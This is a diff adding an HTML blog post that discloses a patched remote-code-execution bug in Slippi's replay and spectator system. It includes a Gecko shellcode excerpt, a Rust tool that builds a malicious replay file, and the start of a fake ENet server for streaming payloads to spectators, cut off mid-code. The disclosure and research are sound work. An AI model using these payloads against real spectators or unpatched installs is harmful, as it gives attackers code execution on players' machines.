@@ -1,0 +1,603 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta content=no-referrer name=referrer><meta content="width=device-width,initial-scale=1.0" name=viewport><title>Slipping up Slippi with spectator RCE</title><meta content="Slipping up Slippi with spectator RCE" property=og:title><meta content="Slipping up Slippi with spectator RCE" name=twitter:title><meta content="I don't think that's tournament-legal." name=description><meta content="I don't think that's tournament-legal." property=og:description><meta content="I don't think that's tournament-legal." name=twitter:description><meta content=https://khang06.github.io/img/previews/slippirce.png property=og:image><meta content="Khang's Stuff" property=og:site_name><meta content=https://khang06.github.io property=og:url><meta content=https://khang06.github.io/img/previews/slippirce.png property=og:image><link href=https://khang06.github.io/base.css rel=stylesheet><link href=https://khang06.github.io/favicon.ico rel=icon type=image/x-icon><link title="Khang's Stuff" href=https://khang06.github.io/atom.xml rel=alternate type=application/atom+xml><body><a class="skip-link p-screen-reader-text" href=#main>Skip to content</a><header class=l-header><a class=p-title__link href=https://khang06.github.io><picture><img src=/img/header.gif></picture></a><p class=p-subtitle>Random projects I felt like writing about</header><main class=l-main id=main><article class=p-article><header class=p-article__header style=background-image:linear-gradient(#000000e6,#0009),url(/img/previews/slippirce.png)><h1>Slipping up Slippi with spectator RCE</h1><div><div class=c-time><time datetime=2026-04-09> 2026-04-09 </time></div></div></header><section class=p-article__body id=js-article><p><em><strong>This vulnerability is patched in Slippi Playback Dolphin 3.5.2, released January 14th, 2026. The launcher automatically updates it.</strong></em><p><a href=https://en.wikipedia.org/wiki/Super_Smash_Bros._Melee rel=external>Super Smash Bros. Melee</a> is a very popular <del>party</del> fighting game for the Nintendo GameCube. Despite three other entries <em>(four if you're weird and count Smash 4 as two games)</em> in the nearly 25 years since its release, Melee still enjoys a healthy competitive scene to this day due to its rushed development unintentionally leading to a fast-paced playstyle rarely seen in later, more casual-focused games. Major tournaments gather hundreds of players and sometimes even outnumber those playing the latest entry, Super Smash Bros. Ultimate!<p>Nowadays, most people want to play games with their friends over the internet, but since the GameCube was released when most people didn't have broadband, online play didn't exist for most of its library, including Melee. Of course, given that this is a game released on an old Nintendo console, it's safe to assume the majority of its players aren't playing exclusively on original hardware.<p>Instead, people play on Slippi.<p><img alt src=/img/slippirce/slippimenu.png><p><a href=https://slippi.gg rel=external>Slippi</a> is a Melee mod that deeply integrates with its own fork of the <a href=https://dolphin-emu.org rel=external>Dolphin</a> GameCube/Wii emulator to bring automatic matchmaking, modern <a href=https://en.wikipedia.org/wiki/Netcode#Rollback rel=external>rollback netcode</a>, and other quality-of-life improvements to an otherwise ancient console-only game. It's widely regarded as one of the main reasons Melee has maintained a consistent playerbase nowadays since it greatly lowers the barrier to entry for newcomers. Its netcode is also much, much better than the official online code in the later games <em>(if you've ever played Ultimate against someone on Wi-Fi, you know how it feels).</em><p>Naturally, I wondered the same thing I do with anything else that interacts with random people on the internet:<p>Is there anything to exploit here?<h1 id=guest-code-execution>Guest Code Execution<a aria-label="Anchor link for: guest-code-execution" class=zola-anchor href=#guest-code-execution><i class="fas fa-link"></i></a></h1><p>The first step toward any emulator escape shenanigans is getting my own code running inside the emulator in the first place. (Un)fortunately, I couldn't find anything exploitable in the main matchmaking modes, so instead I took a look at Slippi's replay system. The specification for Slippi's <code>.slp</code> replay format is publicly documented and available <a href=https://github.com/project-slippi/slippi-wiki/blob/master/SPEC.md rel=external>here</a>.<p>One of the event types caught my eye: <img alt src=/img/slippirce/geckolist.png><p>Gecko codes are cheat codes, much like Action Replay or Game Genie codes. Despite being "cheat" codes, Gecko codes also get used as a general-purpose way of modding GameCube and Wii games. Slippi is no different here, as almost all of the patches it applies to Melee are <a href=https://github.com/project-slippi/slippi-ssbm-asm rel=external>applied as Gecko codes</a>. Slippi also lets you use your own Gecko codes online, provided that they either don't change any gameplay mechanics or are also being used by your opponent <em>(as scary as letting people use their own mods sounds, there aren't any random <a href="https://www.youtube.com/watch?v=5asTiS_FILQ" rel=external>Super Pichus</a> online since that would just lead to a desync)</em>. Storing Gecko codes in the replay file itself lets you play them back without needing to memorize what codes were used to record it, which is convenient for watching matches that used gameplay-altering codes.<p>Since Slippi happily loads any Gecko codes stored in a replay, running my own code from a replay file is fairly trivial because it's basically just a feature. All I have to do is write some shellcode to a random spot in memory and write a branch to it somewhere in game code. Easy!<p>Writing a big Gecko code list manually is annoying, so I used the <a href=https://github.com/JLaferri/gecko rel=external><code>gecko</code></a> tool that's also used in Slippi's build system. Also, instead of writing my exploit code as self-contained shellcode, I decided to be lazy and use FIX94's <a href=https://github.com/FIX94/gc-exploit-common-loader rel=external>gc-exploit-common-loader</a> to chain from being in the middle of game code to loading a normal <code>.dol</code> executable I hardcoded somewhere else in memory. This lets me run my exploit code on its own during testing, then just copy it over to the replay loader later.<p>This gives me one really, really long Gecko code list:<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=plain><span class=giallo-l><span>$Entrypoint []</span></span>
+<span class=giallo-l><span>C216E750 00000007 #entry.S</span></span>
+<span class=giallo-l><span>7C6000A6 5463045E</span></span>
+<span class=giallo-l><span>7C600124 4C00012C</span></span>
+<span class=giallo-l><span>3C208000 60213000</span></span>
+<span class=giallo-l><span>38000000 9401FFC0</span></span>
+<span class=giallo-l><span>3C608000 60631800</span></span>
+<span class=giallo-l><span>7C6803A6 4E800020</span></span>
+<span class=giallo-l><span>60000000 00000000</span></span>
+<span class=giallo-l><span>04001800 7C6000A6</span></span>
+<span class=giallo-l><span>04001804 5463045E</span></span>
+<span class=giallo-l><span>04001808 60632000</span></span>
+<span class=giallo-l><span>0400180C 7C600124</span></span>
+<span class=giallo-l><span>04001810 4C00012C</span></span>
+<span class=giallo-l><span>...</span></span></code></pre><p>Now, how exactly does this get written into the replay file? Unfortunately, the specification is a bit vague about how this gets formatted internally, so I had to do some poking around on my own. I used the <a href=https://github.com/hohav/peppi rel=external><code>peppi</code></a> library to read and write Slippi replays, but it also doesn't fully parse the Gecko code section. Fortunately, the Gecko code event format is basically just a binary version of what's normally in a Gecko code file, with the size aligned to 512 bytes.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=rust><span class=giallo-l><span style=color:#569cd6>use</span><span> std</span><span style=color:#d4d4d4>::</span><span>{fs</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>File</span><span>, io</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>BufReader</span><span>};</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>use</span><span> peppi</span><span style=color:#d4d4d4>::</span><span>{game</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>GeckoCodes</span><span>, io</span><span style=color:#d4d4d4>::</span><span>slippi};</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>// Maybe it would be easier to use the GCT output here, idk</span></span>
+<span class=giallo-l><span style=color:#569cd6>fn</span><span style=color:#dcdcaa> convert_codes</span><span>()</span><span style=color:#d4d4d4> -></span><span style=color:#4ec9b0> GeckoCodes</span><span> {</span></span>
+<span class=giallo-l><span style=color:#569cd6>    let</span><span style=color:#9cdcfe> file</span><span style=color:#d4d4d4> =</span><span> std</span><span style=color:#d4d4d4>::</span><span>fs</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>read_to_string</span><span>(</span><span style=color:#ce9178>"../entry.txt"</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>    let mut</span><span style=color:#9cdcfe> bytes</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> vec!</span><span>[];</span></span>
+<span class=giallo-l><span style=color:#c586c0>    for</span><span style=color:#9cdcfe> line</span><span style=color:#569cd6> in</span><span style=color:#9cdcfe> file</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>lines</span><span>() {</span></span>
+<span class=giallo-l><span style=color:#569cd6>        let</span><span style=color:#9cdcfe> line</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> line</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>trim</span><span>();</span></span>
+<span class=giallo-l><span style=color:#c586c0>        if</span><span style=color:#9cdcfe> line</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>starts_with</span><span>(</span><span style=color:#ce9178>'$'</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#c586c0>            continue</span><span>;</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>        let mut</span><span style=color:#9cdcfe> parts</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> line</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>split_once</span><span>(</span><span style=color:#ce9178>' '</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#c586c0>        if</span><span style=color:#9cdcfe> parts</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>1.</span><span style=color:#dcdcaa>len</span><span>() ></span><span style=color:#b5cea8> 8</span><span> {</span></span>
+<span class=giallo-l><span>            (</span><span style=color:#9cdcfe>parts</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>1</span><span>,</span><span style=color:#9cdcfe> _</span><span>)</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> parts</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>1.</span><span style=color:#dcdcaa>split_at</span><span>(</span><span style=color:#b5cea8>8</span><span>);</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l><span style=color:#569cd6>        let</span><span style=color:#9cdcfe> first</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> u32</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_str_radix</span><span>(</span><span style=color:#9cdcfe>parts</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>0</span><span>,</span><span style=color:#b5cea8> 16</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#569cd6>        let</span><span style=color:#9cdcfe> second</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> u32</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_str_radix</span><span>(</span><span style=color:#9cdcfe>parts</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>1</span><span>,</span><span style=color:#b5cea8> 16</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#9cdcfe>        bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>extend_from_slice</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>first</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>to_be_bytes</span><span>());</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>extend_from_slice</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>second</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>to_be_bytes</span><span>());</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#9cdcfe>    bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>extend_from_slice</span><span>(</span><span style=color:#d4d4d4>&</span><span>[</span><span style=color:#b5cea8>0xFF</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>,</span><span style=color:#b5cea8> 0x00</span><span>]);</span></span>
+<span class=giallo-l><span style=color:#c586c0>    if</span><span style=color:#9cdcfe> bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>len</span><span>()</span><span style=color:#d4d4d4> %</span><span style=color:#b5cea8> 512</span><span style=color:#d4d4d4> !=</span><span style=color:#b5cea8> 0</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>resize</span><span>(((</span><span style=color:#9cdcfe>bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>len</span><span>()</span><span style=color:#d4d4d4> /</span><span style=color:#b5cea8> 512</span><span>)</span><span style=color:#d4d4d4> +</span><span style=color:#b5cea8> 1</span><span>)</span><span style=color:#d4d4d4> *</span><span style=color:#b5cea8> 512</span><span>,</span><span style=color:#b5cea8> 0</span><span>);</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>    let</span><span style=color:#9cdcfe> actual_size</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> bytes</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>len</span><span>()</span><span style=color:#569cd6> as</span><span style=color:#4ec9b0> u32</span><span>;</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>    GeckoCodes</span><span> {</span><span style=color:#9cdcfe> bytes</span><span>,</span><span style=color:#9cdcfe> actual_size</span><span> }</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>fn</span><span style=color:#dcdcaa> main</span><span>() {</span></span>
+<span class=giallo-l><span style=color:#569cd6>    let mut</span><span style=color:#9cdcfe> r</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> BufReader</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>new</span><span>(File</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>open</span><span>(</span><span style=color:#ce9178>"../base.slp"</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>());</span></span>
+<span class=giallo-l><span style=color:#569cd6>    let mut</span><span style=color:#9cdcfe> game</span><span style=color:#d4d4d4> =</span><span> slippi</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>read</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#569cd6>mut</span><span style=color:#9cdcfe> r</span><span>,</span><span style=color:#4ec9b0> None</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#9cdcfe>    game</span><span style=color:#d4d4d4>.</span><span>start</span><span style=color:#d4d4d4>.</span><span>slippi</span><span style=color:#d4d4d4>.</span><span>version </span><span style=color:#d4d4d4>=</span><span> slippi</span><span style=color:#d4d4d4>::</span><span>MAX_SUPPORTED_VERSION;</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>    game</span><span style=color:#d4d4d4>.</span><span>gecko_codes </span><span style=color:#d4d4d4>=</span><span style=color:#4ec9b0> Some</span><span>(</span><span style=color:#dcdcaa>convert_codes</span><span>());</span></span>
+<span class=giallo-l><span>    slippi</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>write</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#569cd6>mut</span><span> File</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>create</span><span>(</span><span style=color:#ce9178>"../exploit.slp"</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>(),</span><span style=color:#d4d4d4> &</span><span style=color:#9cdcfe>game</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>Finally, we have arbitrary guest code execution from a replay!<p><span><video controls src=/img/slippirce/replayace.mp4 style=width:100%></video></span><p>...Okay, arbitrary code execution from a replay you have to convince someone to download and watch is a bit boring. I said there would be <em>remote</em> code execution, right?<h1 id=spectator-mode>Spectator Mode<a aria-label="Anchor link for: spectator-mode" class=zola-anchor href=#spectator-mode><i class="fas fa-link"></i></a></h1><p>In addition to letting people play online matches in a way that isn't awful, Slippi also lets people <em>watch</em> online matches in a way that isn't awful.<p><img alt src=/img/slippirce/spectate.png><p>Instead of requiring one of the players to screenshare on Discord to make their game watchable, Slippi's spectator mode sends just enough game state and input data to mirror the match onto another instance of Dolphin. This looks a lot better than a video stream while also using far less bandwidth, which is very much appreciated in a game that requires a half-decent internet connection. This is also commonly used by streamers running online tournaments for streaming and commentating matches, so an emulator escape that could be triggered purely from being a spectator would still be huge.<p>When starting a broadcast session, Slippi Launcher connects to an <a href=http://enet.bespin.org/ rel=external>ENet</a> server hosted by the Dolphin instance. Upon connecting, Dolphin starts sending the launcher a filtered selection of replay events, which the launcher then relays to a WebSocket hosted on Slippi's servers. On the receiving end, the launcher gets the replay events from the Slippi servers and streams them into a newly created <code>.slp</code> file, which the receiving Dolphin instance continuously tries to read events from.<p><img alt src=/img/slippirce/spectategraph.svg><p>So, in practice, spectator mode is basically just like reading any other replay file, but the events are being streamed instead. Since Gecko code events can also be sent to spectators, this means that arbitrary code can be executed inside the emulator in the same exact way, but it just has to be streamed to the server instead. Sounds easy enough.<p>To do this, I wrote a quick-and-dirty program that hosts its own ENet server and feeds Slippi Launcher replay events from a file instead.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=rust><span class=giallo-l><span style=color:#569cd6>use</span><span> std</span><span style=color:#d4d4d4>::</span><span>{</span></span>
+<span class=giallo-l><span>    collections</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>HashMap</span><span>,</span></span>
+<span class=giallo-l><span>    fs</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>File</span><span>,</span></span>
+<span class=giallo-l><span>    io</span><span style=color:#d4d4d4>::</span><span>{</span><span style=color:#4ec9b0>BufReader</span><span>,</span><span style=color:#4ec9b0> Cursor</span><span>,</span><span style=color:#4ec9b0> Read</span><span>,</span><span style=color:#4ec9b0> Seek</span><span>,</span><span style=color:#4ec9b0> SeekFrom</span><span>},</span></span>
+<span class=giallo-l><span>    net</span><span style=color:#d4d4d4>::</span><span>{</span><span style=color:#4ec9b0>SocketAddr</span><span>,</span><span style=color:#4ec9b0> UdpSocket</span><span>},</span></span>
+<span class=giallo-l><span>    str</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>FromStr</span><span>,</span></span>
+<span class=giallo-l><span>    time</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>Duration</span><span>,</span></span>
+<span class=giallo-l><span>};</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>use</span><span> base64</span><span style=color:#d4d4d4>::</span><span>{</span><span style=color:#4ec9b0>Engine</span><span>, prelude</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>BASE64_STANDARD</span><span>};</span></span>
+<span class=giallo-l><span style=color:#569cd6>use</span><span> byteorder</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>ReadBytesExt</span><span>;</span></span>
+<span class=giallo-l><span style=color:#569cd6>use</span><span> rusty_enet</span><span style=color:#d4d4d4>::</span><span>{</span><span style=color:#4ec9b0>Event</span><span>,</span><span style=color:#4ec9b0> Host</span><span>,</span><span style=color:#4ec9b0> HostSettings</span><span>,</span><span style=color:#4ec9b0> Packet</span><span>};</span></span>
+<span class=giallo-l><span style=color:#569cd6>use</span><span> serde</span><span style=color:#d4d4d4>::</span><span>{</span><span style=color:#4ec9b0>Deserialize</span><span>,</span><span style=color:#4ec9b0> Serialize</span><span>};</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>#[derive(</span><span style=color:#4ec9b0>Deserialize</span><span>)]</span></span>
+<span class=giallo-l><span>#[serde(tag </span><span style=color:#d4d4d4>=</span><span style=color:#ce9178> "type"</span><span>)]</span></span>
+<span class=giallo-l><span style=color:#569cd6>enum</span><span style=color:#4ec9b0> MirrorRequest</span><span> {</span></span>
+<span class=giallo-l><span>    #[serde(rename </span><span style=color:#d4d4d4>=</span><span style=color:#ce9178> "connect_request"</span><span>)]</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>    ConnectRequest</span><span> {</span><span style=color:#9cdcfe> cursor</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> usize</span><span> },</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>#[derive(</span><span style=color:#4ec9b0>Serialize</span><span>)]</span></span>
+<span class=giallo-l><span>#[serde(tag </span><span style=color:#d4d4d4>=</span><span style=color:#ce9178> "type"</span><span>)]</span></span>
+<span class=giallo-l><span style=color:#569cd6>enum</span><span style=color:#4ec9b0> MirrorResponse</span><span>&lt;'</span><span style=color:#4ec9b0>a</span><span>> {</span></span>
+<span class=giallo-l><span>    #[serde(rename </span><span style=color:#d4d4d4>=</span><span style=color:#ce9178> "connect_reply"</span><span>)]</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>    ConnectReply</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        nick</span><span style=color:#d4d4d4>: &</span><span>'</span><span style=color:#4ec9b0>a str</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        version</span><span style=color:#d4d4d4>: &</span><span>'</span><span style=color:#4ec9b0>a str</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        cursor</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> usize</span><span>,</span></span>
+<span class=giallo-l><span>    },</span></span>
+<span class=giallo-l><span>    #[serde(rename </span><span style=color:#d4d4d4>=</span><span style=color:#ce9178> "start_game"</span><span>)]</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>    StartGame</span><span> {</span><span style=color:#9cdcfe> cursor</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> usize</span><span>,</span><span style=color:#9cdcfe> next_cursor</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> usize</span><span> },</span></span>
+<span class=giallo-l><span>    #[serde(rename </span><span style=color:#d4d4d4>=</span><span style=color:#ce9178> "game_event"</span><span>)]</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>    GameEvent</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        payload</span><span style=color:#d4d4d4>: &</span><span>'</span><span style=color:#4ec9b0>a str</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        cursor</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> usize</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        next_cursor</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> usize</span><span>,</span></span>
+<span class=giallo-l><span>    },</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>fn</span><span style=color:#dcdcaa> main</span><span>() {</span></span>
+<span class=giallo-l><span style=color:#569cd6>    let</span><span style=color:#9cdcfe> socket</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> UdpSocket</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>bind</span><span>(SocketAddr</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_str</span><span>(</span><span style=color:#ce9178>"0.0.0.0:51441"</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>())</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#569cd6>    let mut</span><span style=color:#9cdcfe> host</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> Host</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>new</span><span>(</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>        socket</span><span>,</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>        HostSettings</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>            peer_limit</span><span style=color:#d4d4d4>:</span><span style=color:#b5cea8> 4</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>            channel_limit</span><span style=color:#d4d4d4>:</span><span style=color:#b5cea8> 2</span><span>,</span></span>
+<span class=giallo-l><span style=color:#d4d4d4>            ..</span><span>Default</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>default</span><span>()</span></span>
+<span class=giallo-l><span>        },</span></span>
+<span class=giallo-l><span>    )</span></span>
+<span class=giallo-l><span style=color:#d4d4d4>    .</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#dcdcaa>    println!</span><span>(</span><span style=color:#ce9178>"Ready!"</span><span>);</span></span>
+<span class=giallo-l><span style=color:#c586c0>    loop</span><span> {</span></span>
+<span class=giallo-l><span style=color:#c586c0>        while</span><span style=color:#569cd6> let</span><span style=color:#4ec9b0> Ok</span><span>(</span><span style=color:#9cdcfe>packet</span><span>)</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> host</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>service</span><span>()</span></span>
+<span class=giallo-l><span style=color:#d4d4d4>            &&</span><span style=color:#569cd6> let</span><span style=color:#4ec9b0> Some</span><span>(</span><span style=color:#9cdcfe>event</span><span>)</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> packet</span></span>
+<span class=giallo-l><span>        {</span></span>
+<span class=giallo-l><span style=color:#c586c0>            match</span><span style=color:#9cdcfe> event</span><span> {</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>                Event</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>Connect</span><span> {</span><span style=color:#9cdcfe> peer</span><span>,</span><span style=color:#d4d4d4> ..</span><span> }</span><span style=color:#d4d4d4> =></span><span> {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                    println!</span><span>(</span><span style=color:#ce9178>"Peer {} connected"</span><span>,</span><span style=color:#9cdcfe> peer</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>id</span><span>()</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>0</span><span>);</span></span>
+<span class=giallo-l><span>                }</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>                Event</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>Disconnect</span><span> {</span><span style=color:#9cdcfe> peer</span><span>,</span><span style=color:#d4d4d4> ..</span><span> }</span><span style=color:#d4d4d4> =></span><span> {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                    println!</span><span>(</span><span style=color:#ce9178>"Peer {} disconnected"</span><span>,</span><span style=color:#9cdcfe> peer</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>id</span><span>()</span><span style=color:#d4d4d4>.</span><span style=color:#b5cea8>0</span><span>);</span></span>
+<span class=giallo-l><span>                }</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>                Event</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>Receive</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                    peer</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                    channel_id</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                    packet</span><span>,</span></span>
+<span class=giallo-l><span>                }</span><span style=color:#d4d4d4> =></span><span> {</span></span>
+<span class=giallo-l><span style=color:#c586c0>                    if</span><span style=color:#569cd6> let</span><span style=color:#4ec9b0> Ok</span><span>(</span><span style=color:#9cdcfe>message</span><span>)</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> str</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_utf8</span><span>(</span><span style=color:#9cdcfe>packet</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>data</span><span>()) {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                        println!</span><span>(</span><span style=color:#ce9178>"Received packet: {message}"</span><span>);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>                        let mut</span><span style=color:#9cdcfe> send_packet</span><span style=color:#d4d4d4> = |</span><span style=color:#9cdcfe>response</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> MirrorResponse</span><span style=color:#d4d4d4>|</span><span> {</span></span>
+<span class=giallo-l><span style=color:#569cd6>                            let</span><span style=color:#9cdcfe> response_json</span><span style=color:#d4d4d4> =</span><span> serde_json</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>to_string</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>response</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                            println!</span><span>(</span><span style=color:#ce9178>"Sending packet: {response_json}"</span><span>);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>                            let</span><span style=color:#9cdcfe> packet</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> Packet</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>reliable</span><span>(</span><span style=color:#9cdcfe>response_json</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>as_bytes</span><span>());</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                            peer</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>send</span><span>(</span><span style=color:#9cdcfe>channel_id</span><span>,</span><span style=color:#d4d4d4> &</span><span style=color:#9cdcfe>packet</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span>                        };</span></span>
+<span class=giallo-l></span>
